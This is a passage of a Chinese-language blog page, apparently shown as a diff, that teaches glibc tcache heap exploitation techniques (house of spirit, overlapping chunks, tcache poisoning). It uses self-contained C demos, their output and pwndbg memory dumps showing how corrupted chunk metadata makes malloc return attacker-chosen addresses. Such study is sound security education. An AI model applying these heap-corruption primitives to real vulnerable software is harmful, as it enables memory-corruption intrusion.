class="line">0x555555756020:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555555756030:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555555756040:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555555756050:	0x0000555555756260	0x0000000000000000</span><br><span class="line">0x555555756060:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555555756070:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
+
+<p>最后malloc后</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/10gx 0x555555756250</span><br><span class="line">0x555555756250:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x555555756260:	0x0000555555756260	0x0000000000000000</span><br><span class="line">0x555555756270:	0x0000000000000000	0x0000000000020d91</span><br><span class="line">0x555555756280:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555555756290:	0x0000000000000000	0x0000000000000000</span><br><span class="line"></span><br><span class="line">pwndbg&gt; x/16gx 0x555555756000</span><br><span class="line">0x555555756000:	0x0000000000000000	0x0000000000000251</span><br><span class="line">0x555555756010:	0x0000000000000000	0x0000000000000000      ==&gt; counts = 0</span><br><span class="line">0x555555756020:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555555756030:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555555756040:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555555756050:	0x0000555555756260	0x0000000000000000</span><br><span class="line">0x555555756060:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555555756070:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
+
+<h2 id="house-of-spirit"><a href="#house-of-spirit" class="headerlink" title="house of spirit"></a>house of spirit</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">    malloc(1);  // init heap</span><br><span class="line"></span><br><span class="line">    fprintf(stderr, &quot;We will overwrite a pointer to point to a fake &apos;smallbin&apos; region.\n&quot;);</span><br><span class="line">    unsigned long long *a, *b;</span><br><span class="line">    unsigned long long fake_chunk[64] __attribute__ ((aligned (16)));</span><br><span class="line"></span><br><span class="line">    fprintf(stderr, &quot;The chunk:  %p\n&quot;, &amp;fake_chunk[0]);</span><br><span class="line"></span><br><span class="line">    fake_chunk[1] = 0x110;  // the size</span><br><span class="line">    memset(fake_chunk+2, 0x41, sizeof(fake_chunk)-0x10);</span><br><span class="line"></span><br><span class="line">    fprintf(stderr, &quot;Overwritting our pointer with the address of the fake region inside the fake chunk, %p.\n&quot;, &amp;fake_chunk[0]);</span><br><span class="line">    a = &amp;fake_chunk[2];</span><br><span class="line"></span><br><span class="line">    fprintf(stderr, &quot;Freeing the overwritten pointer.\n&quot;);</span><br><span class="line">    free(a);</span><br><span class="line"></span><br><span class="line">    fprintf(stderr, &quot;Now the next malloc will return the region of our fake chunk at %p, which will be %p!\n&quot;, &amp;fake_chunk[0], &amp;fake_chunk[2]);</span><br><span class="line">    b = malloc(0x100);</span><br><span class="line">    memset(fake_chunk+2, 0x42, sizeof(fake_chunk)-0x10);</span><br><span class="line">    fprintf(stderr, &quot;malloc(0x100): %p\n&quot;, b);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>运行之后：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">We will overwrite a pointer to point to a fake &apos;smallbin&apos; region.</span><br><span class="line">The chunk:  0x7ffc4c03f800</span><br><span class="line">Overwritting our pointer with the address of the fake region inside the fake chunk, 0x7ffc4c03f800.</span><br><span class="line">Freeing the overwritten pointer.</span><br><span class="line">Now the next malloc will return the region of our fake chunk at 0x7ffc4c03f800, which will be 0x7ffc4c03f810!</span><br><span class="line">malloc(0x100): 0x7ffc4c03f810</span><br></pre></td></tr></table></figure>
+
+<p>gdb调试：<br>第一次malloc后：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/10gx 0x555555756250</span><br><span class="line">0x555555756250:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x555555756260:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555555756270:	0x0000000000000000	0x0000000000020d91</span><br><span class="line">0x555555756280:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555555756290:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/10gx fake_chunk</span><br><span class="line">0x7fffffffdca0:	0x0000000000000001	0x00007ffff7ffe728</span><br><span class="line">0x7fffffffdcb0:	0x00007ffff7ffe100	0x0000000000000001</span><br><span class="line">0x7fffffffdcc0:	0x00007ffff7fe04c0	0x00007ffff7ddff5f</span><br><span class="line">0x7fffffffdcd0:	0x00007ffff7ffe710	0x0000000000000000</span><br><span class="line">0x7fffffffdce0:	0x0000000000000000	0x00007ffff7ffa298</span><br><span class="line"></span><br><span class="line">pwndbg&gt; x/10gx fake_chunk</span><br><span class="line">0x7fffffffdca0:	0x0000000000000001	0x0000000000000110      ==&gt; 伪造的fake chunk size</span><br><span class="line">0x7fffffffdcb0:	0x00007ffff7ffe100	0x0000000000000001</span><br><span class="line">0x7fffffffdcc0:	0x00007ffff7fe04c0	0x00007ffff7ddff5f</span><br><span class="line">0x7fffffffdcd0:	0x00007ffff7ffe710	0x0000000000000000</span><br><span class="line">0x7fffffffdce0:	0x0000000000000000	0x00007ffff7ffa298</span><br></pre></td></tr></table></figure>
+
+<p>memset将<code>fake_chunk+2</code>后的内存填充为0x41</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/10gx fake_chunk</span><br><span class="line">0x7fffffffdca0:	0x0000000000000001	0x0000000000000110</span><br><span class="line">0x7fffffffdcb0:	0x4141414141414141	0x4141414141414141</span><br><span class="line">0x7fffffffdcc0:	0x4141414141414141	0x4141414141414141</span><br><span class="line">0x7fffffffdcd0:	0x4141414141414141	0x4141414141414141</span><br><span class="line">0x7fffffffdce0:	0x4141414141414141	0x4141414141414141</span><br></pre></td></tr></table></figure>
+
+<p>free后</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/10gx fake_chunk</span><br><span class="line">0x7fffffffdca0:	0x0000000000000001	0x0000000000000110      ==&gt; be freed</span><br><span class="line">0x7fffffffdcb0:	0x0000000000000000	0x4141414141414141</span><br><span class="line">0x7fffffffdcc0:	0x4141414141414141	0x4141414141414141</span><br><span class="line">0x7fffffffdcd0:	0x4141414141414141	0x4141414141414141</span><br><span class="line">0x7fffffffdce0:	0x4141414141414141	0x4141414141414141</span><br><span class="line"></span><br><span class="line">pwndbg&gt; vmmap heap</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">    0x555555756000     0x555555777000 rw-p    21000 0      [heap]</span><br><span class="line"></span><br><span class="line">pwndbg&gt; x/30gx 0x555555756000</span><br><span class="line">0x555555756000:	0x0000000000000000	0x0000000000000251</span><br><span class="line">0x555555756010:	0x0000000000000000	0x0100000000000000      ==&gt; counts</span><br><span class="line">0x555555756020:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555555756030:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555555756040:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555555756050:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555555756060:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555555756070:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555555756080:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555555756090:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5555557560a0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5555557560b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5555557560c0:	0x0000000000000000	0x00007fffffffdcb0      ==&gt; entries</span><br><span class="line">0x5555557560d0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5555557560e0:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
+
+<p>再malloc(0x100)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p a</span><br><span class="line">$1 = (unsigned long long *) 0x7fffffffdcb0</span><br><span class="line">pwndbg&gt; p b</span><br><span class="line">$2 = (unsigned long long *) 0x7fffffffdcb0      //由于a的size被改，此位置被分配给b</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/10gx fake_chunk</span><br><span class="line">0x7fffffffdca0:	0x0000000000000001	0x0000000000000110</span><br><span class="line">0x7fffffffdcb0:	0x4242424242424242	0x4242424242424242      ==&gt; b</span><br><span class="line">0x7fffffffdcc0:	0x4242424242424242	0x4242424242424242</span><br><span class="line">0x7fffffffdcd0:	0x4242424242424242	0x4242424242424242</span><br><span class="line">0x7fffffffdce0:	0x4242424242424242	0x4242424242424242</span><br></pre></td></tr></table></figure>
+
+<h2 id="tcache-overlapping-chunks"><a href="#tcache-overlapping-chunks" class="headerlink" title="tcache_overlapping_chunks"></a>tcache_overlapping_chunks</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;stdint.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">    intptr_t *p1, *p2, *p3;</span><br><span class="line"></span><br><span class="line">    p1 = malloc(0x50 - 8);</span><br><span class="line">    p2 = malloc(0x20 - 8);</span><br><span class="line">    memset(p1, 0x41, 0x50-8);</span><br><span class="line">    memset(p2, 0x41, 0x30-8);</span><br><span class="line">    fprintf(stderr, &quot;Allocated victim chunk with requested size 0x48: %p\n&quot;, p1);</span><br><span class="line">    fprintf(stderr, &quot;Allocated sentry element after victim: %p\n&quot;, p2);</span><br><span class="line"></span><br><span class="line">    int evil_chunk_size = 0x110;</span><br><span class="line">    int evil_region_size = 0x110 - 8;</span><br><span class="line">    fprintf(stderr, &quot;Emulating corruption of the victim&apos;s size to 0x110\n&quot;);</span><br><span class="line">    *(p1-1) = evil_chunk_size;</span><br><span class="line">    fprintf(stderr, &quot;Freed victim chunk to put it in a different tcache bin\n&quot;);</span><br><span class="line">    free(p1);</span><br><span class="line"></span><br><span class="line">    p3 = malloc(evil_region_size);</span><br><span class="line">    memset(p3, 0x42, evil_region_size);</span><br><span class="line">    fprintf(stderr, &quot;Requested a chunk of 0x100 bytes\n&quot;);</span><br><span class="line">    fprintf(stderr, &quot;p3: %p ~ %p\n&quot;, p3, (char *)p3+evil_region_size);</span><br><span class="line">    fprintf(stderr, &quot;p2: %p ~ %p\n&quot;, p2, (char *)p2+0x20-8);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>运行结果：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Allocated victim chunk with requested size 0x48: 0x555555756260</span><br><span class="line">Allocated sentry element after victim: 0x5555557562b0</span><br><span class="line">Emulating corruption of the victim&apos;s size to 0x110</span><br><span class="line">Freed victim chunk to put it in a different tcache bin</span><br><span class="line">Requested a chunk of 0x100 bytes</span><br><span class="line">p3: 0x555555756260 ~ 0x555555756368</span><br><span class="line">p2: 0x5555557562b0 ~ 0x5555557562c8</span><br></pre></td></tr></table></figure>
+
+<p>gdb调试：<br>申请两个chunk</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/16gx 0x555555756250</span><br><span class="line">0x555555756250:	0x0000000000000000	0x0000000000000051      ==&gt; p1</span><br><span class="line">0x555555756260:	0x4141414141414141	0x4141414141414141</span><br><span class="line">0x555555756270:	0x4141414141414141	0x4141414141414141</span><br><span class="line">0x555555756280:	0x4141414141414141	0x4141414141414141</span><br><span class="line">0x555555756290:	0x4141414141414141	0x4141414141414141</span><br><span class="line">0x5555557562a0:	0x4141414141414141	0x0000000000000021      ==&gt; p2</span><br><span class="line">0x5555557562b0:	0x4141414141414141	0x4141414141414141</span><br><span class="line">0x5555557562c0:	0x4141414141414141	0x4141414141414141</span><br></pre></td></tr></table></figure>
+
+<p>第一个chunk的size被修改并free</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/16gx 0x555555756250</span><br><span class="line">0x555555756250:	0x0000000000000000	0x0000000000000110      ==&gt; 修改chunk的size</span><br><span class="line">0x555555756260:	0x0000000000000000	0x4141414141414141      ==&gt; be freed</span><br><span class="line">0x555555756270:	0x4141414141414141	0x4141414141414141</span><br><span class="line">0x555555756280:	0x4141414141414141	0x4141414141414141</span><br><span class="line">0x555555756290:	0x4141414141414141	0x4141414141414141</span><br><span class="line">0x5555557562a0:	0x4141414141414141	0x0000000000000021</span><br><span class="line">0x5555557562b0:	0x4141414141414141	0x4141414141414141</span><br><span class="line">0x5555557562c0:	0x4141414141414141	0x4141414141414141</span><br><span class="line"></span><br><span class="line">pwndbg&gt; x/30gx 0x555555756000 </span><br><span class="line">0x555555756000:	0x0000000000000000	0x0000000000000251</span><br><span class="line">0x555555756010:	0x0000000000000000	0x0100000000000000      ==&gt; counts</span><br><span class="line">0x555555756020:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555555756030:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555555756040:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555555756050:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555555756060:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555555756070:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555555756080:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555555756090:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5555557560a0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5555557560b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5555557560c0:	0x0000000000000000	0x0000555555756260      ==&gt; entries</span><br><span class="line">0x5555557560d0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5555557560e0:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
+
+<p>申请<code>0x110-8</code>大小的p3</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/12gx 0x0000555555756250</span><br><span class="line">0x555555756250:	0x0000000000000000	0x0000000000000110      ==&gt; p3 (原来p1的位置，且将后面的p2覆盖)</span><br><span class="line">0x555555756260:	0x4242424242424242	0x4242424242424242</span><br><span class="line">0x555555756270:	0x4242424242424242	0x4242424242424242</span><br><span class="line">0x555555756280:	0x4242424242424242	0x4242424242424242</span><br><span class="line">0x555555756290:	0x4242424242424242	0x4242424242424242</span><br><span class="line">0x5555557562a0:	0x4242424242424242	0x4242424242424242      ==&gt; p2</span><br></pre></td></tr></table></figure>
+
+<p>造成了堆块重叠</p>
+<h2 id="tcache-poisoning"><a href="#tcache-poisoning" class="headerlink" title="tcache_poisoning"></a>tcache_poisoning</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;stdint.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">    intptr_t *p1, *p2, *p3;</span><br><span class="line">    size_t target[10];</span><br><span class="line">    printf(&quot;Our target is a stack region at %p\n&quot;, (void *)target);</span><br><span class="line"></span><br><span class="line">    p1 = malloc(0x30);</span><br><span class="line">    memset(p1, 0x41, 0x30+8);</span><br><span class="line">    fprintf(stderr, &quot;Allocated victim chunk with requested size 0x30 at %p\n&quot;, p1);</span><br><span class="line"></span><br><span class="line">    fprintf(stderr, &quot;Freed victim chunk to put it in a tcache bin\n&quot;);</span><br><span class="line">    free(p1);</span><br><span class="line">    fprintf(stderr, &quot;Emulating corruption of the next ptr\n&quot;);</span><br><span class="line">    *p1 = (int64_t)target;</span><br><span class="line"></span><br><span class="line">    fprintf(stderr, &quot;Now we make two requests for the appropriate size so that malloc returns a chunk overlapping our target\n&quot;);</span><br><span class="line">    p2 = malloc(0x30);</span><br><span class="line">    memset(p2, 0x42, 0x30+8);</span><br><span class="line">    p3 = malloc(0x30);</span><br><span class="line">    memset(p3, 0x42, 0x30+8);</span><br><span class="line">    fprintf(stderr, &quot;The first malloc(0x30) returned %p, the second one: %p\n&quot;, p2, p3);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>运行结果：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Our target is a stack region at 0x7ffdb6b5b510</span><br><span class="line">Allocated victim chunk with requested size 0x30 at 0x561fe4ccb670</span><br><span class="line">Freed victim chunk to put it in a tcache bin</span><br><span class="line">Emulating corruption of the next ptr</span><br><span class="line">Now we make two requests for the appropriate size so that malloc returns a chunk overlapping our target</span><br><span class="line">The first malloc(0x30) returned 0x561fe4ccb670, the second one: 0x7ffdb6b5b510</span><br></pre></td></tr></table></figure>
+
+<p>gdb调试：<br><img src="https://i.loli.net/2019/11/01/yhFoAjx8NwTeKUc.png" alt="target地址"><br>创建一个chunk p1</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/10gx 0x555555756660</span><br><span class="line">0x555555756660:	0x0000000000000000	0x0000000000000041</span><br><span class="line">0x555555756670:	0x4141414141414141	0x4141414141414141</span><br><span class="line">0x555555756680:	0x4141414141414141	0x4141414141414141</span><br><span class="line">0x555555756690:	0x4141414141414141	0x4141414141414141</span><br><span class="line">0x5555557566a0:	0x4141414141414141	0x0000000000020961</span><br></pre></td></tr></table></figure>
+
+<p>free后：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/10gx 0x555555756660</span><br><span class="line">0x555555756660:	0x0000000000000000	0x0000000000000041</span><br><span class="line">0x555555756670:	0x0000000000000000	0x4141414141414141      ==&gt; fd被删除 / **</span><br><span class="line">0x555555756680:	0x4141414141414141	0x4141414141414141</span><br><span class="line">0x555555756690:	0x4141414141414141	0x4141414141414141</span><br><span class="line">0x5555557566a0:	0x4141414141414141	0x0000000000020961</span><br><span class="line"></span><br><span class="line">pwndbg&gt; vmmap heap</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">    0x555555756000     0x555555777000 rw-p    21000 0      [heap]</span><br><span class="line"></span><br><span class="line">pwndbg&gt; x/16gx 0x555555756000</span><br><span class="line">0x555555756000:	0x0000000000000000	0x0000000000000251</span><br><span class="line">0x555555756010:	0x0000000000010000	0x0000000000000000      ==&gt; counts</span><br><span class="line">0x555555756020:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555555756030:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555555756040:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555555756050:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555555756060:	0x0000555555756670	0x0000000000000000      ==&gt; entries</span><br><span class="line">0x555555756070:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
+
+<p>将fd指针修改为target</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/10gx 0x555555756660</span><br><span class="line">0x555555756660:	0x0000000000000000	0x0000000000000041</span><br><span class="line">0x555555756670:	0x00007fffffffde40	0x4141414141414141    ==&gt; fd被修改为target addr</span><br><span class="line">0x555555756680:	0x4141414141414141	0x4141414141414141</span><br><span class="line">0x555555756690:	0x4141414141414141	0x4141414141414141</span><br><span class="line">0x5555557566a0:	0x4141414141414141	0x0000000000020961</span><br></pre></td></tr></table></figure>
+
+<p>申请p2</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/10gx 0x555555756660</span><br><span class="line">0x555555756660:	0x0000000000000000	0x0000000000000041</span><br><span class="line">0x555555756670:	0x4242424242424242	0x4242424242424242</span><br><span class="line">0x555555756680:	0x4242424242424242	0x4242424242424242</span><br><span class="line">0x555555756690:	0x4242424242424242	0x4242424242424242</span><br><span class="line">0x5555557566a0:	0x4242424242424242	0x0000000000020961</span><br><span class="line"></span><br><span class="line">pwndbg&gt; x/16gx 0x555555756000</span><br><span class="line">0x555555756000:	0x0000000000000000	0x0000000000000251</span><br><span class="line">0x555555756010:	0x0000000000000000	0x0000000000000000    ==&gt; counts = 0</span><br><span class="line">0x555555756020:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555555756030:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555555756040:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555555756050:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555555756060:	0x00007fffffffde40	0x0000000000000000    ==&gt; entries被修改为我们写的fd，指向栈上的target</span><br><span class="line">0x555555756070:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
+
+<p>申请p3</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">//此时的counts虽然为0，但是`tcache_get`并没有做检查，而是直接从entries处返回了一个chunk</span><br><span class="line">pwndbg&gt; x/16gx 0x555555756000</span><br><span class="line">0x555555756000:	0x0000000000000000	0x0000000000000251</span><br><span class="line">0x555555756010:	0x0000000000ff0000	0x0000000000000000    ==&gt; counts = 0-1 = 0xff 【产生了整数溢出】可被unsorted bin attack 利用</span><br><span class="line">0x555555756020:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555555756030:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555555756040:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555555756050:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555555756060:	0x0000000000000009	0x0000000000000000</span><br><span class="line">0x555555756070:	0x0000000000000000	0x0000000000000000</span><br><span class="line"></span><br><span class="line">pwndbg&gt; x/10gx &amp;p3</span><br><span class="line">0x7fffffffde38:	0x00007fffffffde40	0x4242424242424242    ==&gt; 直接写入了target处--|</span><br><span class="line">0x7fffffffde48:	0x4242424242424242	0x4242424242424242                           |</span><br><span class="line">0x7fffffffde58:	0x4242424242424242	0x4242424242424242                           |</span><br><span class="line">0x7fffffffde68:	0x4242424242424242	0x4242424242424242                           |</span><br><span class="line">0x7fffffffde78:	0x0000000000000000	0x00005555555549d0                           |</span><br><span class="line">                                                                                     |</span><br><span class="line">pwndbg&gt; x/10gx 